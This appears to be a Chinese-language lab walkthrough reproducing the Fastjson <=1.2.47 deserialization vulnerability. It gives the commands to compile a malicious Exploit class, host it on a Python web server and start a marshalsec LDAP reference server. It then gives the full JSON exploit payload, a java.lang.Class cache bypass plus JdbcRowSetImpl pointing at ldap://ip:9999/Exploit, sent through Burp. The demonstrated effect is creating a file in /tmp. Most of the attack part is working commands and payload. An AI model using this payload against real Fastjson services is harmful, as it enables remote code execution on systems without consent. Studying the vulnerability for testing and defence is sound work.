![img](./PIC/index.png)

# Fastjson<=1.2.47反序列化漏洞为例

1、此时/tmp目录

![img](./PIC/tmp.png)

2、编译Exploit.java
javac Exploit.java

![img](./PIC/exploit.png)

3、 使用python搭建一个临时的web服务

[root@qiqi wordpress]# python -m SimpleHTTPServer  1111

Serving HTTP on 0.0.0.0 port 1111 ...

Ps：此步是为了接收LDAP服务重定向请求，需要在payload的目录下开启此web服务，这样才可以访问到payload文件


4、服务器使用marshalsec开启LDAP服务监听：

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip/1111/#Exploit 9999

Ps：使用marshalsec工具快捷的开启LDAP

服务。借助LDAP服务将LDAP reference result 重定向到web服务器。

LDAP动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。

5、 Exploit.class恶意类执行的命令是：

在tmp目录下创建名为qiqi的文件。

Burp发包

使用EXP：

{

  "name":{

    "@type":"java.lang.Class",
    
    "val":"com.sun.rowset.JdbcRowSetImpl"

  },

  "x":{

    "@type":"com.sun.rowset.JdbcRowSetImpl",
    
    "dataSourceName":"ldap://ip:9999/Exploit",
    
    "autoCommit":true

  }



}

![img](./PIC/burp.png)

此时/tmp目录

![img](./PIC/qiqi.png)
